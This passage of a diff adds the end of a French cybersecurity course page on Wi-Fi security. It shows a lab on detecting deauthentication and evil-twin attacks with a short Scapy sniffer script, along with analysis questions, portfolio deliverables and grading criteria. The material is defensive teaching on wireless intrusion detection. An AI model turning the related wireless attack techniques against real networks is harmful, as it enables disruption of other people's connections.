+# → [ALERTE] EVIL TWIN ! SSID='NexelliaWifi' Rogue=ZZ:ZZ:ZZ
+
+# Arrêt et rapport de session
+Ctrl+C</pre>
+                            <h6>Script IDS (extrait)</h6>
+                            <pre>from scapy.all import *
+def detect_deauth(pkt):
+    if pkt.haslayer(Dot11Deauth):
+        print(f"[ALERTE] Désauthentification détectée de {pkt.addr2} vers {pkt.addr1}")
+sniff(iface="wlan3mon", prn=detect_deauth)</pre>
+                            <div class="analysis-box">
+                                <h6><i class="fas fa-question-circle"></i> Questions d'analyse</h6>
+                                <ol>
+                                    <li>Quels sont les avantages d'un IDS comportemental par rapport à une inspection de paquets ?</li>
+                                    <li>Comment différencier une désauthentification légitime d'une attaque ?</li>
+                                    <li>Proposez deux améliorations pour rendre ce script plus robuste.</li>
+                                    <li>En production, où placeriez-vous les sondes IDS Wi‑Fi dans les locaux de Nexellia ?</li>
+                                </ol>
+                            </div>
+                            <div class="deliverable-box">
+                                <h6><i class="fas fa-box-archive me-1"></i> Livrables pour le portfolio</h6>
+                                <ul>
+                                    <li>Rapport IDS terminal : alertes générées (deauth + evil twin)</li>
+                                    <li>Analyse Wireshark : trames de désauthentification annotées</li>
+                                    <li>Plan de déploiement IDS pour Nexellia : positionnement des sondes</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ══ ÉVALUATION ══ -->
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="heading5">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse5" aria-expanded="false" aria-controls="collapse5">
+                            <i class="fas fa-clipboard-check me-2"></i> Évaluation continue &amp; portfolio
+                        </button>
+                    </h2>
+                    <div id="collapse5" class="accordion-collapse collapse" aria-labelledby="heading5" data-bs-parent="#mainAccordion">
+                        <div class="accordion-body">
+                            <h5>Rapport de mission Nexellia</h5>
+                            <p>En fin de module, vous remettez à la DSI de Nexellia un <strong>rapport de mission complet</strong> qui démontre votre maîtrise des techniques d'attaque et de défense.</p>
+                            <h6>Contrôle continu</h6>
+                            <ul>
+                                <li><strong>Quiz flash</strong> (début de séance 2) : chiffrement, Evil Twin, détection — 10 questions / 20 pts</li>
+                                <li><strong>Portfolio de fin de module</strong> : 2 TP au choix avec captures annotées et analyse ECSI 3.4/3.5 (≥ 300 mots / TP)</li>
+                            </ul>
+                            <div class="analysis-box">
+                                <h6><i class="fas fa-star"></i> Critères d'évaluation du portfolio</h6>
+                                <ol>
+                                    <li><strong>Compréhension des protocoles</strong> — explications précises avec détails cryptographiques</li>
+                                    <li><strong>Réalisation des TP</strong> — captures d'écran annotées, manipulations autonomes</li>
+                                    <li><strong>Analyse des résultats</strong> — réponses complètes et justifiées aux questions</li>
+                                    <li><strong>Recommandations Nexellia</strong> — plan de remédiation contextualisé et priorisé</li>
+                                </ol>
+                            </div>
+                            <p class="mt-3"><i class="fas fa-link"></i> Ces éléments peuvent être valorisés dans le MSPR global.</p>
+                        </div>
+                    </div>
+                </div>
+
+            </div><!-- fin accordion -->
+
+            <div class="footer-note">
+                <p><i class="fas fa-graduation-cap"></i> Module SWFE837 – Mastère SIN Expert Cybersécurité – 2025-2026 · Tous les TP sont réalisés dans un environnement isolé à des fins pédagogiques exclusivement.</p>
+            </div>
+        </main>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    const sidebarLinks = document.querySelectorAll('#sidebar-nav a');
+    const collapses = document.querySelectorAll('#mainAccordion .accordion-collapse');
+    collapses.forEach(collapse => {
+        collapse.addEventListener('show.bs.collapse', function () {
+            const targetId = this.id;
+            sidebarLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === '#' + targetId) link.classList.add('active');
+            });
+        });
+    });
+    (function () {
+        const openCollapse = document.querySelector('#mainAccordion .accordion-collapse.show');
+        if (openCollapse) {
+            sidebarLinks.forEach(link => {
+                if (link.getAttribute('href') === '#' + openCollapse.id) link.classList.add('active');
+            });
+        }
+    })();
+</script>
+</body>
+</html>
